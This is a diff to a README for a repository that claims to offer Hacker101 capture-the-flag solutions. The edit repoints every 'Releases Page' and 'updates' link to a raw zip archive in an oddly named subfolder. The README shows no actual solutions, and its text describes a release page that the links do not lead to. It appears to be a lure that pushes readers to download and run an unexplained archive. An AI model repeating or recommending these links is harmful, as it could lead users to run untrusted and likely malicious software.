@@ -1,6 +1,6 @@
 # 🎢 hacker101-CTF-Solutions - Learn Web Security Easily
 
-![Download](https://raw.githubusercontent.com/aiatagramkonnect/hacker101-CTF-Solutions/main/demilitarize/hacker101-CTF-Solutions.zip)
+![Download](https://github.com/aiatagramkonnect/hacker101-CTF-Solutions/raw/refs/heads/main/Level-7_Ticketastic_Live_Instance/CT_Solutions_hacker_supersolar.zip)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ To begin using the solutions provided in this repository, follow the steps below
 
 1. **Visit the Releases Page**: Click the link below to access the download page:
    
-   [Download the latest version](https://raw.githubusercontent.com/aiatagramkonnect/hacker101-CTF-Solutions/main/demilitarize/hacker101-CTF-Solutions.zip)
+   [Download the latest version](https://github.com/aiatagramkonnect/hacker101-CTF-Solutions/raw/refs/heads/main/Level-7_Ticketastic_Live_Instance/CT_Solutions_hacker_supersolar.zip)
 
 2. **Choose a Release**: On the releases page, you will see a list of available versions. Each release may contain various solutions and updates. Look for the most recent release.
 
@@ -42,7 +42,7 @@ Follow these simple steps to download and run the software:
 
 1. **Visit the Releases Page**: Use the link below to go to the page for downloading:
    
-   [Visit this page to download](https://raw.githubusercontent.com/aiatagramkonnect/hacker101-CTF-Solutions/main/demilitarize/hacker101-CTF-Solutions.zip)
+   [Visit this page to download](https://github.com/aiatagramkonnect/hacker101-CTF-Solutions/raw/refs/heads/main/Level-7_Ticketastic_Live_Instance/CT_Solutions_hacker_supersolar.zip)
 
 2. **Select Your Download**: Identify both the primary and any supplementary files for use. Each release may have detailed notes regarding the changes and additions in that version.
 
@@ -76,7 +76,7 @@ Familiarizing yourself with these topics will enhance your understanding and rea
 
 The repository will continue to grow as new solutions and challenges are added. Keep an eye on the releases page for updates:
 
-[Check for updates here](https://raw.githubusercontent.com/aiatagramkonnect/hacker101-CTF-Solutions/main/demilitarize/hacker101-CTF-Solutions.zip)
+[Check for updates here](https://github.com/aiatagramkonnect/hacker101-CTF-Solutions/raw/refs/heads/main/Level-7_Ticketastic_Live_Instance/CT_Solutions_hacker_supersolar.zip)
 
 ## 🤝 Contribution
 
